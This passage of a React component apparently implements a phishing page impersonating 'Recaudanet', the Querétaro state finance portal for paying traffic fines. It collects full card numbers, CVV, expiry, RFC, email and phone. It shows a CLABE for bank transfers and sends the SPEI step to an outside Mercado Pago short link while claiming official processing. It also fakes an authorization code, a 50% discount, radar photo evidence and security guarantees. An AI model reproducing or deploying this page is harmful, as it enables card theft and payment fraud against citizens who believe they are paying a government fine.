                          className="w-full bg-emerald-600 hover:bg-emerald-500 text-white py-4 rounded-xl text-center text-base font-bold tracking-wide transition-all shadow-lg border-b-4 border-emerald-800 active:border-b-0 active:translate-y-[4px] cursor-pointer"
                        >
                          PAGAR AHORA CON EL 50%
                        </button>
                      </div>

                      <div className="text-center space-y-1">
                        <p className="text-[11px] text-gray-400 leading-relaxed">
                          Su pago se procesará a través de la pasarela segura oficial de la Secretaría de Finanzas. Aceptamos todas las tarjetas de crédito, débito y transferencias electrónicas.
                        </p>
                        <div className="flex items-center justify-center gap-4 text-gray-500 text-[10px] pt-4 border-t border-blue-900/20">
                          <span className="flex items-center gap-1"><ShieldCheck className="w-3.5 h-3.5 text-blue-500" /> SSL Encriptado</span>
                          <span className="flex items-center gap-1"><Building2 className="w-3.5 h-3.5 text-blue-500" /> Conexión Directa</span>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* STEP 1: BILLING DETAILS */}
                  {paymentStep === 1 && (
                    <div className="space-y-5">
                      <div>
                        <h4 className="font-bold text-white text-sm">Paso 1: Datos de Contacto y Facturación</h4>
                        <p className="text-xs text-gray-400">Requerido para generar su comprobante digital.</p>
                      </div>

                      <div className="space-y-3.5 text-xs">
                        <div className="space-y-1">
                          <label className="block text-gray-400 font-semibold uppercase">RFC (Opcional para Facturar):</label>
                          <input
                            type="text"
                            value={rfc}
                            onChange={(e) => setRfc(e.target.value.toUpperCase())}
                            placeholder="Ej. GOMM851014T30"
                            maxLength={13}
                            className="w-full bg-[#001a33] border border-[#004080] rounded-lg p-2.5 font-mono text-white focus:outline-none focus:border-blue-500 uppercase placeholder:text-gray-600"
                          />
                        </div>

                        <div className="space-y-1">
                          <label className="block text-gray-400 font-semibold uppercase">Correo Electrónico (Para envío del comprobante):</label>
                          <input
                            type="email"
                            required
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            placeholder="usuario@correo.com"
                            className="w-full bg-[#001a33] border border-[#004080] rounded-lg p-2.5 text-white focus:outline-none focus:border-blue-500 placeholder:text-gray-600"
                          />
                        </div>

                        <div className="space-y-1">
                          <label className="block text-gray-400 font-semibold uppercase">Teléfono Celular:</label>
                          <input
                            type="tel"
                            value={phone}
                            onChange={(e) => setPhone(e.target.value)}
                            placeholder="442-000-0000"
                            className="w-full bg-[#001a33] border border-[#004080] rounded-lg p-2.5 text-white focus:outline-none focus:border-blue-500 placeholder:text-gray-600"
                          />
                        </div>
                      </div>

                      <div className="grid grid-cols-2 gap-3 pt-2">
                        <button
                          onClick={() => setPaymentStep(0)}
                          className="bg-slate-950 hover:bg-slate-900 border border-slate-800 text-gray-300 py-2.5 rounded-lg text-xs font-bold uppercase transition-colors"
                        >
                          Cancelar
                        </button>
                        <button
                          onClick={() => {
                            if (!email.includes("@")) {
                              alert("Por favor, introduzca un correo electrónico válido.");
                              return;
                            }
                            setPaymentStep(2);
                          }}
                          className="bg-blue-600 hover:bg-blue-500 text-white py-2.5 rounded-lg text-xs font-bold uppercase transition-colors"
                        >
                          Siguiente
                        </button>
                      </div>
                    </div>
                  )}

                  {/* STEP 2: CHOOSE METHOD */}
                  {paymentStep === 2 && (
                    <div className="space-y-5">
                      <div>
                        <h4 className="font-bold text-white text-sm">Paso 2: Método de Pago</h4>
                        <p className="text-xs text-gray-400">Seleccione el canal de transacciones seguro de Querétaro.</p>
                      </div>

                      <div className="space-y-3">
                        {/* Option 1: Card */}
                        <div 
                          onClick={() => setPaymentMethod("CARD")}
                          className={`p-3.5 rounded-lg border cursor-pointer transition-all flex items-center justify-between ${
                            paymentMethod === "CARD" 
                              ? "bg-blue-950/50 border-blue-400 text-white" 
                              : "bg-[#001a33] border-[#004080] text-gray-300 hover:border-blue-800"
                          }`}
                        >
                          <div className="flex items-center gap-3">
                            <CreditCard className="w-5 h-5 text-blue-400" />
                            <div className="text-left">
                              <p className="text-xs font-bold uppercase">Tarjeta de Crédito o Débito</p>
                              <p className="text-[10px] text-gray-400">Visa, Mastercard, AMEX • Aprobación inmediata</p>
                            </div>
                          </div>
                          <div className={`w-4 h-4 rounded-full border flex items-center justify-center ${
                            paymentMethod === "CARD" ? "border-blue-400 bg-blue-500" : "border-gray-600"
                          }`}>
                            {paymentMethod === "CARD" && <Check className="w-2.5 h-2.5 text-white" />}
                          </div>
                        </div>

                        {/* Option 2: SPEI */}
                        <div 
                          onClick={() => setPaymentMethod("SPEI")}
                          className={`p-3.5 rounded-lg border cursor-pointer transition-all flex items-center justify-between ${
                            paymentMethod === "SPEI" 
                              ? "bg-blue-950/50 border-blue-400 text-white" 
                              : "bg-[#001a33] border-[#004080] text-gray-300 hover:border-blue-800"
                          }`}
                        >
                          <div className="flex items-center gap-3">
                            <Building2 className="w-5 h-5 text-blue-400" />
                            <div className="text-left">
                              <p className="text-xs font-bold uppercase">Transferencia SPEI (CLABE)</p>
                              <p className="text-[10px] text-gray-400">Transferencia electrónica bancaria 24/7</p>
                            </div>
                          </div>
                          <div className={`w-4 h-4 rounded-full border flex items-center justify-center ${
                            paymentMethod === "SPEI" ? "border-blue-400 bg-blue-500" : "border-gray-600"
                          }`}>
                            {paymentMethod === "SPEI" && <Check className="w-2.5 h-2.5 text-white" />}
                          </div>
                        </div>
                      </div>

                      <div className="grid grid-cols-2 gap-3 pt-2">
                        <button
                          onClick={() => setPaymentStep(1)}
                          className="bg-slate-950 hover:bg-slate-900 border border-slate-800 text-gray-300 py-2.5 rounded-lg text-xs font-bold uppercase transition-colors"
                        >
                          Atrás
                        </button>
                        <button
                          onClick={() => {
                            setPaymentStep(3); // card inputs or spei
                          }}
                          className="bg-blue-600 hover:bg-blue-500 text-white py-2.5 rounded-lg text-xs font-bold uppercase transition-colors"
                        >
                          Siguiente
                        </button>
                      </div>
                    </div>
                  )}

                  {/* STEP 3: DETAILED PAY CAPTURE (CARD FORM OR SPEI INFO) */}
                  {paymentStep === 3 && (
                    <div className="space-y-5">
                      
                      {paymentMethod === "CARD" ? (
                        /* CARD OPTION FORM */
                        <form onSubmit={handleProcessPayment} className="space-y-4">
                          <div className="flex justify-between items-center">
                            <h4 className="font-bold text-white text-sm">Paso 3: Pago de Infracción</h4>
                            <span className="text-xs text-blue-300 font-mono font-bold">${(currentInfraction.amountBase * (1 - currentInfraction.discount)).toLocaleString('es-MX', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} MXN</span>
                          </div>

                          {/* BEAUTIFUL VIRTUAL CREDIT CARD GRAPHIC */}
                          <div className="w-full h-36 bg-gradient-to-tr from-blue-800 to-[#002d56] rounded-xl p-4 text-white flex flex-col justify-between shadow-lg border border-blue-500/20 relative overflow-hidden font-mono text-xs">
                            <div className="absolute -right-6 -bottom-6 w-24 h-24 bg-blue-400/10 rounded-full blur-xl pointer-events-none" />
                            <div className="flex justify-between items-start">
                              <div className="space-y-0.5">
                                <p className="text-[9px] text-blue-300 tracking-wider">BANCO CENTRAL QUERÉTARO</p>
                                <div className="w-8 h-6 bg-amber-400/80 rounded-md shadow-inner" />
                              </div>
                              <span className="text-xs italic font-bold text-white">VISA</span>
                            </div>

                            <div className="space-y-1.5 mt-2">
                              {/* Display Card Number nicely formatted with groups of 4 */}
                              <p className="text-sm tracking-widest font-bold">
                                {cardNumber || "•••• •••• •••• ••••"}
                              </p>
                              <div className="flex justify-between text-[8px] text-gray-300">
                                <div>
                                  <p className="text-[6px] text-gray-400 font-sans">TITULAR</p>
                                  <p className="font-semibold uppercase truncate max-w-[150px]">{cardHolder || "CIUDADANO EJEMPLAR"}</p>
                                </div>
                                <div className="text-right">
                                  <p className="text-[6px] text-gray-400 font-sans">VENCE</p>
                                  <p className="font-semibold">{cardExpiry || "MM/YY"}</p>
                                </div>
                                <div className="text-right">
                                  <p className="text-[6px] text-gray-400 font-sans">CVV</p>
                                  <p className="font-semibold">{cardCvv || "•••"}</p>
                                </div>
                              </div>
                            </div>
                          </div>

                          {/* FORM FIELDS */}
                          <div className="space-y-2.5 text-xs">
                            <div className="space-y-1">
                              <label className="block text-gray-400 font-semibold uppercase">Nombre del Titular:</label>
                              <input
                                type="text"
                                required
                                value={cardHolder}
                                onChange={(e) => setCardHolder(e.target.value)}
                                placeholder="Escriba como aparece en la tarjeta"
                                className="w-full bg-[#001a33] border border-[#004080] rounded-lg p-2.5 text-white focus:outline-none focus:border-blue-500 uppercase placeholder:text-gray-600"
                              />
                            </div>

                            <div className="space-y-1">
                              <label className="block text-gray-400 font-semibold uppercase">Número de Tarjeta:</label>
                              <input
                                type="text"
                                required
                                value={cardNumber}
                                onChange={(e) => {
                                  // Auto space card number formatting
                                  const val = e.target.value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
                                  const matches = val.match(/\d{4,16}/g);
                                  const match = (matches && matches[0]) || "";
                                  const parts = [];

                                  for (let i = 0, len = match.length; i < len; i += 4) {
                                    parts.push(match.substring(i, i + 4));
                                  }

                                  if (parts.length > 0) {
                                    setCardNumber(parts.join(" "));
                                  } else {
                                    setCardNumber(val);
                                  }
                                }}
                                placeholder="4000 1234 5678 9010"
                                maxLength={19}
                                className="w-full bg-[#001a33] border border-[#004080] rounded-lg p-2.5 text-white font-mono focus:outline-none focus:border-blue-500 placeholder:text-gray-600"
                              />
                            </div>

                            <div className="grid grid-cols-2 gap-3">
                              <div className="space-y-1">
                                <label className="block text-gray-400 font-semibold uppercase">Vencimiento:</label>
                                <input
                                  type="text"
                                  required
                                  value={cardExpiry}
                                  onChange={(e) => {
                                    // auto-slash MM/YY
                                    let val = e.target.value.replace(/[^0-9]/g, "");
                                    if (val.length >= 2) {
                                      val = val.substring(0, 2) + "/" + val.substring(2, 4);
                                    }
                                    setCardExpiry(val);
                                  }}
                                  placeholder="MM/YY"
                                  maxLength={5}
                                  className="w-full bg-[#001a33] border border-[#004080] rounded-lg p-2.5 text-white text-center font-mono focus:outline-none focus:border-blue-500 placeholder:text-gray-600"
                                />
                              </div>

                              <div className="space-y-1">
                                <label className="block text-gray-400 font-semibold uppercase">Código CVV:</label>
                                <input
                                  type="password"
                                  required
                                  value={cardCvv}
                                  onChange={(e) => setCardCvv(e.target.value.replace(/[^0-9]/g, ""))}
                                  placeholder="123"
                                  maxLength={4}
                                  className="w-full bg-[#001a33] border border-[#004080] rounded-lg p-2.5 text-white text-center font-mono focus:outline-none focus:border-blue-500 placeholder:text-gray-600"
                                />
                              </div>
                            </div>
                          </div>

                          {/* SECURITY PLEDGE & SUBMIT BUTTON */}
                          <div className="pt-2 text-[10px] text-gray-400 flex items-center gap-1">
                            <ShieldCheck className="w-4 h-4 text-emerald-500 flex-shrink-0" />
                            <span>Su conexión está cifrada con TLS 1.3 de grado bancario militar.</span>
                          </div>

                          <div className="grid grid-cols-2 gap-3 pt-2">
                            <button
                              type="button"
                              onClick={() => setPaymentStep(2)}
                              className="bg-slate-950 hover:bg-slate-900 border border-slate-800 text-gray-300 py-2.5 rounded-lg text-xs font-bold uppercase transition-colors"
                            >
                              Atrás
                            </button>
                            <button
                              type="submit"
                              className="bg-emerald-600 hover:bg-emerald-500 text-white py-2.5 rounded-lg text-xs font-bold uppercase tracking-wider transition-colors shadow-md shadow-emerald-950/40"
                            >
                              PROCESAR PAGO
                            </button>
                          </div>
                        </form>
                      ) : (
                        /* SPEI INTERACTIVE INSTRUCTIONS */
                        <div className="space-y-4 text-xs">
                          <h4 className="font-bold text-white text-sm">Paso 3: Transferencia Bancaria SPEI</h4>
                          <p className="text-gray-400 text-xs">Transfiera exactamente el monto indicado desde su banca móvil.</p>

                          <div className="bg-[#001a33] border border-[#004080] rounded-lg p-4 space-y-3 font-mono">
                            <div className="flex justify-between border-b border-blue-900/40 pb-2">
                              <span className="text-gray-400">Banco Receptor:</span>
                              <span className="font-bold text-white">BANCO DE MÉXICO / FINANZAS</span>
                            </div>
                            <div className="flex justify-between border-b border-blue-900/40 pb-2">
                              <span className="text-gray-400">CLABE Interbancaria:</span>
                              <span className="font-bold text-white select-all">012 442 00482938104 2</span>
                            </div>
                            <div className="flex justify-between border-b border-blue-900/40 pb-2">
                              <span className="text-gray-400">Concepto de Pago:</span>
                              <span className="font-bold text-blue-300">{currentInfraction.folio}</span>
                            </div>
                             <div className="flex justify-between">
                              <span className="text-gray-400">Importe exacto:</span>
                              <span className="font-bold text-white text-sm">${(currentInfraction.amountBase * (1 - currentInfraction.discount)).toLocaleString('es-MX', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} MXN</span>
                            </div>
                          </div>

                          <div className="p-3 bg-amber-500/10 border border-amber-500/20 rounded text-[11px] text-amber-200 leading-relaxed">
                            <strong>Nota de validación:</strong> Al realizar la transferencia SPEI, el sistema detectará el pago automáticamente en un periodo de 5 a 10 minutos y liberará los adeudos de su vehículo.
                          </div>

                          <div className="grid grid-cols-2 gap-3 pt-2">
                            <button
                              onClick={() => setPaymentStep(2)}
                              className="bg-slate-950 hover:bg-slate-900 border border-slate-800 text-gray-300 py-2.5 rounded-lg text-xs font-bold uppercase transition-colors"
                            >
                              Atrás
                            </button>
                            <button
                              onClick={() => {
                                const txFolio = `QRO-TX-${Math.floor(100000 + Math.random() * 900000)}`;
                                const nowStr = new Date().toLocaleDateString("es-MX", {
                                  day: "2-digit",
                                  month: "short",
                                  year: "numeric",
                                  hour: "2-digit",
                                  minute: "2-digit"
                                });
                                setInfractions(prev => ({
                                  ...prev,
                                  [activePlate]: {
                                    ...prev[activePlate],
                                    status: "PAGADO",
                                    paymentFolio: txFolio,
                                    paymentDate: nowStr
                                  }
                                }));
                                
                                // Open the real payment link in a new window/tab
                                window.open("https://mpago.la/2Hcar5n", "_blank");
                                
                                setPaymentStep(4);
                              }}
                              className="bg-blue-600 hover:bg-blue-500 text-white py-2.5 rounded-lg text-xs font-bold uppercase transition-colors"
                            >
                              PROCESAR PAGO SPEI
                            </button>
                          </div>
                        </div>
                      )}
                    </div>
                  )}

                </>
              )}

              {/* STAGE C: PAGO COMPLETADO CON ÉXITO - RECIBO DE PAGO OFICIAL */}
              {paymentStep === 4 && currentInfraction && (
                <div className="space-y-6 text-center">
                  <div className="w-14 h-14 bg-emerald-500/15 rounded-full border border-emerald-500/30 flex items-center justify-center text-emerald-400 mx-auto">
                    <CheckCircle2 className="w-8 h-8 animate-bounce" />
                  </div>

                  <div className="space-y-1">
                    <span className="text-[10px] font-bold uppercase tracking-widest text-emerald-400">PAGO PROCESADO CON ÉXITO</span>
                    <h3 className="text-xl font-bold text-white font-display">Recibo Digital Oficial</h3>
                    <p className="text-xs text-gray-400">La multa asociada ha sido liquidada con éxito.</p>
                  </div>

                  {/* VOUCHER RECEIPT DATA */}
                  <div className="bg-[#001a33] border border-[#004080] rounded-lg p-4 text-xs text-left space-y-2.5 font-mono">
                    <div className="flex justify-between border-b border-blue-900/30 pb-2">
                      <span className="text-gray-400">Contribuyente:</span>
                      <span className="text-gray-200 uppercase truncate max-w-[150px]">{rfc || "PUBLICO GENERAL"}</span>
                    </div>
                    <div className="flex justify-between border-b border-blue-900/30 pb-2">
                      <span className="text-gray-400">Folio Transacción:</span>
                      <span className="text-blue-300 font-bold">{currentInfraction.paymentFolio}</span>
                    </div>
                    <div className="flex justify-between border-b border-blue-900/30 pb-2">
                      <span className="text-gray-400">Código Autorización:</span>
                      <span className="text-emerald-400 font-bold">042918</span>
                    </div>
                    <div className="flex justify-between border-b border-blue-900/30 pb-2">
                      <span className="text-gray-400">Concepto:</span>
                      <span className="text-gray-200 truncate max-w-[150px]">{currentInfraction.folio}</span>
                    </div>
                    <div className="flex justify-between border-b border-blue-900/30 pb-2">
                      <span className="text-gray-400">Fecha del Pago:</span>
                      <span className="text-gray-300">{currentInfraction.paymentDate}</span>
                    </div>
                    <div className="flex justify-between text-sm pt-1">
                      <span className="text-gray-400 font-semibold">Total Pagado:</span>
                      <span className="text-white font-bold">${(currentInfraction.amountBase * (1 - currentInfraction.discount)).toLocaleString('es-MX', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} MXN</span>
                    </div>
                  </div>

                  <div className="space-y-2">
                    <button
                      onClick={() => window.print()}
                      className="w-full bg-slate-900 hover:bg-slate-800 text-white border border-slate-700 py-3 rounded-lg text-xs font-bold tracking-wider uppercase flex items-center justify-center gap-1.5 cursor-pointer"
                    >
                      <Printer className="w-4 h-4 text-blue-400" /> Imprimir Comprobante Oficial
                    </button>
                    
                    <button
                      onClick={() => setPaymentStep(0)}
                      className="w-full text-xs text-blue-400 hover:text-white font-bold transition-colors cursor-pointer"
                    >
                      Regresar al Dashboard Principal
                    </button>
                  </div>
                  
                  <div className="text-[10px] text-gray-500">
                    Este documento es una constancia digital oficial emitida de conformidad con la Ley de Hacienda del Estado de Querétaro.
                  </div>
                </div>
              )}

            </div>

            {/* SEGURIDAD DE RECAUDANET SHIELD */}
            <div className="bg-[#002d56]/40 border border-[#004080]/30 rounded-xl p-5 flex gap-4 items-start">
              <ShieldCheck className="w-10 h-10 text-blue-400 flex-shrink-0" />
              <div className="text-xs space-y-1.5">
                <span className="font-bold text-white uppercase tracking-wider block">Garantía Ciudadana y Enlace Seguro</span>
                <p className="text-gray-400 leading-relaxed">
                  Todas las consultas y pagos realizados en Recaudanet están resguardados por el sistema de autenticación de la Secretaría de Finanzas. Su información financiera nunca es almacenada y se transmite de forma cifrada mediante protocolos SSL de última generación.
                </p>
              </div>
            </div>

          </div>

        </div>

        {/* INTERACTIVE ROW: SEARCH */}
        <div className="bg-[#002545]/40 border border-[#003d73]/50 p-6 sm:p-8 rounded-xl max-w-4xl mx-auto w-full mt-10 sm:mt-12 mb-4 shadow-xl">
          <div className="space-y-3">
            <label className="block text-xs font-bold uppercase tracking-widest text-blue-300 text-center sm:text-left">
              Consulte su Placa del Estado de Querétaro
            </label>
            <form onSubmit={handleSearch} className="flex flex-col sm:flex-row gap-3">
              <div className="relative flex-1">
                <div className="absolute inset-y-0 left-4 flex items-center pointer-events-none text-gray-400">
                  <Search className="w-5 h-5" />
                </div>
                <input
                  type="text"
                  placeholder="Ej. UKM-892-A, QRO-712-X, etc."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="w-full bg-[#001a33] border border-[#004080] rounded-xl py-3.5 pl-12 pr-4 text-base font-mono tracking-widest text-white focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent placeholder:text-gray-500 uppercase shadow-inner"
                />
              </div>
              <button
                type="submit"
                className="bg-blue-600 hover:bg-blue-500 text-white px-8 py-3.5 rounded-xl text-sm font-bold tracking-wide transition-all flex items-center justify-center gap-2 shadow-lg hover:shadow-blue-500/20 active:translate-y-[1px]"
              >
                Buscar Adeudo
              </button>
            </form>
            {searchError && (
              <p className="text-xs text-red-400 flex items-center gap-1 justify-center sm:justify-start">
                <AlertTriangle className="w-4 h-4 text-red-400" /> {searchError}
              </p>
            )}
          </div>
        </div>

      </main>

      {/* FOOTER */}
      <footer id="recaudanet-footer" className="bg-[#001429] mt-12 py-8 px-6 sm:px-10 border-t border-blue-900/40 text-[11px] text-gray-400 flex flex-col md:flex-row justify-between items-center gap-4 uppercase tracking-widest text-center md:text-left">
        <div className="space-y-1.5">
          <p className="font-bold">© 2026 RECAUDANET QUERÉTARO | Secretaría de Finanzas del Estado</p>
          <p className="text-gray-500 normal-case tracking-normal">Desarrollado para la consulta directa de multas de tránsito de vehículos de uso particular y mercantil.</p>
        </div>
        <div className="flex flex-wrap justify-center gap-6 text-[10px]">
          <span className="hover:text-white transition-colors cursor-pointer">Aviso de Privacidad</span>
          <span className="hover:text-white transition-colors cursor-pointer">Términos y Condiciones</span>
          <span className="hover:text-white transition-colors cursor-pointer">Ayuda en Línea</span>
          <span className="hover:text-white transition-colors cursor-pointer">Reglamento Estatal</span>
        </div>
      </footer>

      {/* MODAL 1: PHOTOGRAPHIC EVIDENCE MOCK CAMERA FLASH */}
      <AnimatePresence>
        {showEvidence && currentInfraction && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm">
            <motion.div
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.9 }}
              className="bg-[#002545] border border-[#004080] rounded-xl max-w-lg w-full overflow-hidden shadow-2xl"
            >
              <div className="p-4 bg-[#002d56] border-b border-[#004080] flex justify-between items-center text-white">
                <div className="flex items-center gap-2">
                  <Eye className="w-4 h-4 text-blue-400" />
                  <span className="font-bold text-xs uppercase tracking-wider">Evidencia Fotográfica de Fotomulta</span>
                </div>
                <button 
                  onClick={() => setShowEvidence(false)}
                  className="text-gray-400 hover:text-white p-1 rounded-full transition-colors"
                >
                  <X className="w-4.5 h-4.5" />
                </button>
              </div>

              {/* CAMERA FEED SIMULATION */}
              <div className="p-6 space-y-4">
                <div className="relative bg-black rounded-lg border-2 border-red-900 overflow-hidden aspect-video shadow-inner font-mono text-[10px] text-red-500 p-2.5">
                  
                  {/* Camerawork lines */}
                  <div className="absolute inset-0 border border-red-500/10 pointer-events-none" />
                  <div className="absolute inset-x-0 top-1/2 -translate-y-1/2 border-t border-red-500/20" />
                  <div className="absolute inset-y-0 left-1/2 -translate-x-1/2 border-l border-red-500/20" />
                  
                  {/* Reticle brackets */}
                  <div className="absolute top-4 left-4 w-4 h-4 border-t-2 border-l-2 border-red-500" />
                  <div className="absolute top-4 right-4 w-4 h-4 border-t-2 border-r-2 border-red-500" />
                  <div className="absolute bottom-4 left-4 w-4 h-4 border-b-2 border-l-2 border-red-500" />
                  <div className="absolute bottom-4 right-4 w-4 h-4 border-b-2 border-r-2 border-red-500" />

                  {/* Speed camera flash vignette overlay */}
                  <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-red-500/10 pointer-events-none" />

                  {/* CAR SHAPE DRAWN WITH POLISHED CSS AND SVG FOR AN OFFICIAL RUGGED LOOK */}
                  <div className="absolute inset-0 flex flex-col items-center justify-center space-y-2 opacity-80 scale-105">
                    <div className="relative w-48 h-20 bg-slate-900 border border-red-500/40 rounded-t-2xl flex items-end justify-center shadow-md">
                      
                      {/* Rear window */}
                      <div className="absolute top-3 w-36 h-8 bg-zinc-950 border border-red-500/20 rounded-t-lg flex items-center justify-center">
                        <div className="w-1.5 h-1.5 rounded-full bg-red-600 animate-pulse" />
                      </div>

                      {/* License Plate on Car */}
                      <div className="bg-yellow-100 border border-black/80 px-2 py-0.5 rounded text-black text-[9px] font-bold font-mono tracking-wide shadow mb-1 flex items-center gap-1">
                        <span className="text-[5px] text-gray-500 font-sans block">QRO</span>
                        {currentInfraction.plate}
                      </div>

                      {/* Tail lights */}
                      <div className="absolute bottom-4 left-3 w-4 h-2 bg-red-600 rounded-sm shadow-[0_0_10px_rgba(220,38,38,1)]" />
                      <div className="absolute bottom-4 right-3 w-4 h-2 bg-red-600 rounded-sm shadow-[0_0_10px_rgba(220,38,38,1)]" />
                      
                      {/* Wheels shadow */}
                      <div className="absolute -bottom-1 left-4 w-8 h-2 bg-black rounded-full" />
                      <div className="absolute -bottom-1 right-4 w-8 h-2 bg-black rounded-full" />
                    </div>
                  </div>

                  {/* On-screen telemetry readouts (real ones, not slop, representing radar data) */}
                  <div className="absolute top-3 left-3 space-y-1 text-gray-400 bg-black/70 p-1.5 rounded border border-red-500/30">
                    <p>RADAR ID: <span className="text-white">QRO-RADAR-23</span></p>
                    <p>UBICACIÓN: <span className="text-white">RADAR 23 QUERÉTARO</span></p>
                    <p>EMISIÓN: <span className="text-white">{currentInfraction.date.split(" - ")[0]}</span></p>
                  </div>

                  <div className="absolute bottom-3 right-3 text-right bg-black/70 p-1.5 rounded border border-red-500/30 space-y-0.5">
                    <p className="text-red-400 font-bold text-xs">EXCESO DETECTADO</p>
                    <p className="text-white text-base font-bold">104 KM/H</p>
                    <p className="text-gray-400">LÍMITE: 80 KM/H</p>
                  </div>

                  {/* FLASH SIMULATOR OVERLAY EFFECT */}
                  <div className="absolute inset-0 bg-white/5 animate-pulse pointer-events-none" />
                </div>

                <div className="space-y-2 text-xs text-gray-300">
                  <p className="font-bold text-white uppercase tracking-wider">Acreditación Técnica de Evidencia</p>
                  <p className="leading-relaxed text-gray-400">
                    Esta imagen se capturó automáticamente mediante un cinemómetro láser de alta precisión y se transmitió al centro de procesamiento de la Secretaría de Seguridad Ciudadana. La lectura de placas se valida mediante OCR (Reconocimiento Óptico de Caracteres) con un 99.8% de fiabilidad.
                  </p>
                </div>
              </div>

              <div className="p-4 bg-[#001a33] border-t border-[#004080] flex justify-end">
                <button
                  onClick={() => setShowEvidence(false)}
                  className="bg-blue-600 hover:bg-blue-500 text-white font-bold py-1.5 px-4 rounded text-xs transition-colors cursor-pointer"
                >
                  Cerrar Evidencia
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>



    </div>
  );
}
